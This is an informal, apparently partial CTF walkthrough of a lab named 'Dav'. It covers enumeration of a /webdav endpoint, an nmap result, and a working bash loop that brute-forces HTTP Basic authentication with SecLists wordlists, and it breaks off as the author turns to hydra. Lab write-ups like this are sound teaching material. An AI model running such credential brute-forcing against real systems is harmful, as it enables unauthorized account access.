# Dav Writeup | Full CTF Walkthrough


![Room page](https://www.digitalocean.com/cdn-cgi/image/quality=75/https://www.digitalocean.com/api/static-content/v1/images?src=https%3A%2F%2Fassets.digitalocean.com%2Farticles%2Fhow-to-install-apache-webserver-22.04%2Fapache-default.PNG&raw=1)

## Part 1 Reconnaissance


### Directory Enumuration 


Since the directory enumuration that we're doing now is the recursive one so 

We found one endpoint that was requiring login to proceed the endpoint was

- /webdav

### Nmap

The nmap output was 

```nmap
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
```

Meaning the room is more squuzeed because there is no ssh.


When we proceed to the endpoint /webdav it was a simple browser-based login page.


Now we need to bruteforce it.

For this we're using the below script to get the credentials

```bash
while IFS= read -r password; do
    while IFS= read -r username; do
        pair="${username}:${password}"

        size=$(curl -s \
            -H "Authorization: Basic $(printf '%s' "$pair" | base64)" \
            http://<ip>/webdav | wc -c)

        if [ "$size" -ne 460 ]; then
            echo "Found: $pair (response size: $size)"
            break 2
        fi
    done < <(cat /home/Seclists/Usernames/*.txt)
done < <(cat /home/Seclists/Passwords/*.txt)
```

But the script was taking longer than usual it took 1 hour to run and still didn't gave any output and in the mean time i was waiting while scroolling to get the content.


But we need to get to the point that in this way if we do brutefocing the server will know and we will not be able to get the password too.

We need to switch to hydra.


